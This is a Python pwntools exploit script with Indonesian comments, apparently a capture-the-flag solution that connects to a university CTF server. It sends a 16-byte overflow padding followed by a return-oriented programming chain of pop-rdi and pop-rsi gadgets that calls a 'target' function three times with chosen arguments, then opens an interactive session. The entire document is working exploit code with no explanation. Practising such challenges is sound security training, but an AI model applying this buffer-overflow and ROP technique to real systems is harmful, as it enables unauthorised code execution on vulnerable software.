#!/usr/bin/python3
from pwn import *

# Mengatur binary target
target_binary = context.binary = ELF("chall")

# Membuka koneksi ke server
connection = remote("ctf99.cs.ui.ac.id", 10019)

# Gadget yang ditemukan oleh Ropper
gadget_pop_rdi = 0x400863
gadget_pop_rsi_r15 = 0x400861

# Nilai-nilai yang akan kita masukkan ke register
value_1_rdi = 0x1234567812345678
value_1_rsi = 0x8765432187654321
value_2_rdi = 0x1122334455667788
value_2_rsi = 0x8877665544332211
value_3_rdi = 0x4141414142424242
value_3_rsi = 0x4343434344444444

# Nilai sembarang untuk register r15
junk_value = 0xDEADBEEF

# Membuat payload
payload = b"A" * 16
payload += flat(
    gadget_pop_rdi,
    value_1_rdi,
    gadget_pop_rsi_r15,
    value_1_rsi,
    junk_value,
    target_binary.sym.target,
    gadget_pop_rdi,
    value_2_rdi,
    gadget_pop_rsi_r15,
    value_2_rsi,
    junk_value,
    target_binary.sym.target,
    gadget_pop_rdi,
    value_3_rdi,
    gadget_pop_rsi_r15,
    value_3_rsi,
    junk_value,
    target_binary.sym.target,
)

# Mengirim payload ke server
connection.sendline(payload)

# Memulai sesi interaktif untuk menerima output dari server
connection.interactive()
